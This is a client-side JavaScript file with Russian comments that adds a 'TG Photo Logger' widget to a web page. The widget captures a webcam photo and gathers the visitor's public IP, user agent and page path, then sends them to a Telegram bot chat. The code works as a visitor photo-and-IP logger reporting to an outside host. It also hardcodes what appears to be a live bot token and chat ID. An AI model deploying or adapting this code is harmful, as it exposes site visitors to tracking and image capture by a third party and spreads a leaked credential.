// new_script.js
// Полный рабочий пример отправки фото + публичный IP в Telegram (клиентский).
// ВСТАВЬ СВОИ ЗНАЧЕНИЯ НИЖЕ перед деплоем.
// WARNING: BOT_TOKEN в клиентском коде виден всем. Это небезопасно в проде.

(function () {
  'use strict';

  /************** Конфигурация (замените) ****************/
  // Пример формата токена: "123456789:AAABBBcccDDD..."
  const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
  // chat_id вида "123456789" или "-1001234567890"
  const CHAT_ID = "7518382960";
  // Максимальный размер фото в байтах (чтобы избежать проблем)
  const MAX_FILE_BYTES = 3_000_000; // 3 МБ
  // Сколько сообщений отправлять за одну сессию (sessionStorage)
  const MAX_MESSAGES_PER_SESSION = 2;
  // Флаг в sessionStorage
  const SESSION_FLAG = "tg_photo_logger_sent_v1";
  // URL для получения публичного IP (ipify позволяет CORS)
  const PUBLIC_IP_API = "https://api.ipify.org?format=json";
  /********************************************************/

  /* --- DOM-элементы создаются динамически, чтобы не требовать изменений в index.html --- */
  // Если хочешь, можешь убрать генерацию UI и вызывать функции из консоли.
  const wrapperId = 'tg-photo-logger-wrapper';
  let wrapper = document.getElementById(wrapperId);

  if (!wrapper) {
    wrapper = document.createElement('div');
    wrapper.id = wrapperId;
    // Небольшой минималистичный стиль
    wrapper.style.position = 'fixed';
    wrapper.style.right = '12px';
    wrapper.style.bottom = '12px';
    wrapper.style.zIndex = '99999';
    wrapper.style.background = 'rgba(255,255,255,0.98)';
    wrapper.style.border = '1px solid #ddd';
    wrapper.style.padding = '8px';
    wrapper.style.borderRadius = '8px';
    wrapper.style.boxShadow = '0 6px 18px rgba(0,0,0,0.08)';
    wrapper.style.fontFamily = 'system-ui,Segoe UI,Roboto,Arial';
    wrapper.style.fontSize = '13px';
    wrapper.style.maxWidth = '320px';
    document.body.appendChild(wrapper);
  }

  wrapper.innerHTML = `
    <div style="display:flex;flex-direction:column;gap:6px">
      <div style="font-weight:600">TG Photo Logger</div>
      <video id="tg_video" autoplay playsinline style="width:260px;height:auto;border-radius:6px;background:#000"></video>
      <div style="display:flex;gap:6px;flex-wrap:wrap">
        <button id="tg_start" style="padding:6px 8px;border-radius:6px">Включить камеру</button>
        <button id="tg_capture" style="padding:6px 8px;border-radius:6px" disabled>Сфоткать</button>
        <button id="tg_send" style="padding:6px 8px;border-radius:6px" disabled>Отправить</button>
        <button id="tg_stop" style="padding:6px 8px;border-radius:6px" disabled>Выключить</button>
      </div>
      <div style="display:flex;gap:6px;align-items:center">
        <select id="tg_facing" style="padding:4px 6px;border-radius:6px">
          <option value="user">Фронтальная</option>
          <option value="environment">Задняя</option>
        </select>
        <div id="tg_status" style="flex:1;color:#333">Готов.</div>
      </div>
      <img id="tg_preview" alt="preview" style="display:block;max-width:100%;border-radius:6px;border:1px solid #eee;margin-top:6px"/>
    </div>
  `;

  const videoEl = wrapper.querySelector('#tg_video');
  const startBtn = wrapper.querySelector('#tg_start');
  const captureBtn = wrapper.querySelector('#tg_capture');
  const sendBtn = wrapper.querySelector('#tg_send');
  const stopBtn = wrapper.querySelector('#tg_stop');
  const facingSelect = wrapper.querySelector('#tg_facing');
  const statusEl = wrapper.querySelector('#tg_status');
  const previewImg = wrapper.querySelector('#tg_preview');

  // Вспомогательные переменные
  let stream = null;
  let lastBlob = null;

  // Утилиты
  function setStatus(text) {
    statusEl.textContent = text;
  }

  function safeLog(...args) {
    // Безопасный лог в консоль
    if (window.console && window.console.log) console.log('[TGLogger]', ...args);
  }

  // Получить публичный IP через сервис (ipify)
  async function getPublicIP(timeoutMs = 4000) {
    try {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeoutMs);
      const resp = await fetch(PUBLIC_IP_API, { signal: controller.signal });
      clearTimeout(id);
      if (!resp.ok) {
        safeLog('ip api non-ok', resp.status);
        return null;
      }
      const j = await resp.json().catch(() => null);
      return (j && j.ip) ? j.ip : null;
    } catch (e) {
      safeLog('ip fetch failed', e && e.message ? e.message : e);
      return null;
    }
  }

  // Запуск камеры с выбранным facingMode
  async function startCamera() {
    if (stream) return;
    const facingMode = facingSelect.value || 'user';
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
      videoEl.srcObject = stream;
      captureBtn.disabled = false;
      stopBtn.disabled = false;
      setStatus('Камера включена.');
      safeLog('camera started facingMode=', facingMode);
    } catch (e) {
      setStatus('Ошибка доступа к камере: ' + (e && e.message ? e.message : String(e)));
      safeLog('camera error', e);
    }
  }

  // Останов камеры
  function stopCamera() {
    if (!stream) return;
    stream.getTracks().forEach(t => t.stop());
    stream = null;
    videoEl.srcObject = null;
    captureBtn.disabled = true;
    stopBtn.disabled = true;
    setStatus('Камера выключена.');
    safeLog('camera stopped');
  }

  // Снять кадр -> Blob jpeg
  function capturePhoto(quality = 0.85) {
    return new Promise(resolve => {
      try {
        const videoWidth = videoEl.videoWidth || 640;
        const videoHeight = videoEl.videoHeight || 480;
        const canvas = document.createElement('canvas');
        canvas.width = videoWidth;
        canvas.height = videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(videoEl, 0, 0, videoWidth, videoHeight);
        canvas.toBlob(blob => {
          if (!blob) {
            setStatus('Не удалось создать изображение.');
            resolve(null);
            return;
          }
          if (blob.size > MAX_FILE_BYTES) {
            // Попытка уменьшить качество до 0.6 если большой файл
            safeLog('initial blob too big', blob.size);
            canvas.toBlob(blob2 => {
              if (!blob2) {
                setStatus('Ошибка сжатия изображения.');
                resolve(null);
                return;
              }
              lastBlob = blob2;
              previewImg.src = URL.createObjectURL(blob2);
              sendBtn.disabled = false;
              setStatus('Фото готово. Размер: ' + Math.round(blob2.size / 1024) + ' КБ.');
              resolve(blob2);
            }, 'image/jpeg', 0.6);
            return;
          }

          lastBlob = blob;
          previewImg.src = URL.createObjectURL(blob);
          sendBtn.disabled = false;
          setStatus('Фото готово. Размер: ' + Math.round(blob.size / 1024) + ' КБ.');
          resolve(blob);
        }, 'image/jpeg', quality);
      } catch (e) {
        safeLog('capture exception', e);
        setStatus('Ошибка при съёмке.');
        resolve(null);
      }
    });
  }

  // Подготовка подписи (caption)
  function buildCaption(ip) {
    const time = new Date().toISOString();
    const ua = navigator.userAgent || '-';
    const page = location.pathname + (location.search || '');
    const parts = [
      `Время: ${time}`,
      `Страница: ${page}`,
      `IP: ${ip || 'не получен'}`,
      `UA: ${ua}`
    ];
    // Telegram ограничивает длину подписи ~1024. Обрезаем заранее.
    let caption = parts.join('\n');
    if (caption.length > 900) caption = caption.slice(0, 900) + '...';
    return caption;
  }

  // Отправить фото в Telegram sendPhoto (multipart/form-data)
  async function sendPhotoToTelegram(blob, caption) {
    if (!BOT_TOKEN || !CHAT_ID) {
      setStatus('Ошибка конфигурации: BOT_TOKEN или CHAT_ID не заданы.');
      safeLog('missing BOT_TOKEN or CHAT_ID');
      return { ok: false, reason: 'config' };
    }

    setStatus('Отправка фото в Telegram...');
    const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'photo.jpg');
    if (caption) form.append('caption', caption);

    try {
      const resp = await fetch(url, {
        method: 'POST',
        body: form,
        // mode: 'cors' по умолчанию
      });
      // Если ответ корректный, Telegram вернёт статус 200. Но иногда CORS даст ошибку до этого.
      const text = await resp.text().catch(() => null);
      if (!resp.ok) {
        setStatus('Telegram вернул ошибку: ' + resp.status);
        safeLog('telegram non-ok', resp.status, text);
        return { ok: false, status: resp.status, text };
      }
      setStatus('Фото отправлено. Статус: ' + resp.status);
      safeLog('telegram ok', text);
      return { ok: true, text };
    } catch (err) {
      // Частая причина: CORS. Логируем и возвращаем причину.
      setStatus('Ошибка отправки (возможно CORS). Смотрите консоль.');
      safeLog('sendPhoto fetch error', err && (err.message || err));
      return { ok: false, reason: 'fetch_error', error: String(err) };
    }
  }

  // Проверка лимита отправки за сессию
  function canSendThisSession() {
    const sent = Number(sessionStorage.getItem(SESSION_FLAG) || '0');
    return sent < MAX_MESSAGES_PER_SESSION;
  }
  function markSentThisSession() {
    const sent = Number(sessionStorage.getItem(SESSION_FLAG) || '0');
    sessionStorage.setItem(SESSION_FLAG, String(sent + 1));
  }

  // Основная функция: получить IP, отправить фото с подписью
  async function captureAndSend(extraNote) {
    if (!canSendThisSession()) {
      setStatus('Достигнут лимит отправки за сессию.');
      return { ok: false, reason: 'session_limit' };
    }

    if (!lastBlob) {
      setStatus('Нет снимка. Сначала сделайте фото.');
      return { ok: false, reason: 'no_blob' };
    }

    // Получаем публичный IP (если не получилось => null)
    setStatus('Получаю публичный IP...');
    const ip = await getPublicIP().catch(() => null);
    const captionBase = buildCaption(ip);
    const caption = extraNote ? `${captionBase}\n${String(extraNote).slice(0, 200)}` : captionBase;

    // Попытка отправки
    const result = await sendPhotoToTelegram(lastBlob, caption);

    if (result && result.ok) {
      markSentThisSession();
    } else {
      // Если ошибка CORS или fetch_error, сообщаем в консоль и возвращаем ошибку
      safeLog('send result', result);
    }

    return result;
  }

  // UI обработчики
  startBtn.addEventListener('click', () => startCamera());
  stopBtn.addEventListener('click', () => stopCamera());
  captureBtn.addEventListener('click', () => {
    capturePhoto().then(blob => {
      if (blob) {
        safeLog('captured blob size', blob.size);
      }
    });
  });
  sendBtn.addEventListener('click', async () => {
    // disable button during send
    sendBtn.disabled = true;
    const res = await captureAndSend();
    // re-enable after short delay
    setTimeout(() => { sendBtn.disabled = false; }, 700);
    return res;
  });

  // Включаем кнопку "Отправить" только когда есть lastBlob
  const observer = new MutationObserver(() => {
    sendBtn.disabled = !lastBlob;
  });
  observer.observe(previewImg, { attributes: true, attributeFilter: ['src'] });

  // Авто-ограничение: если токен не задан, показываем предупреждение
  if (!BOT_TOKEN || !CHAT_ID) {
    setStatus('BOT_TOKEN или CHAT_ID не заданы. Настройте в new_script.js');
    safeLog('configure BOT_TOKEN and CHAT_ID in script');
  } else {
    setStatus('Готов. Включите камеру и сделайте фото.');
  }

  // Экспорт API в window для внешнего управления
  window.TGPhotoLogger = {
    startCamera,
    stopCamera,
    capturePhoto,
    captureAndSend,
    getPublicIP,
    buildCaption
  };

})();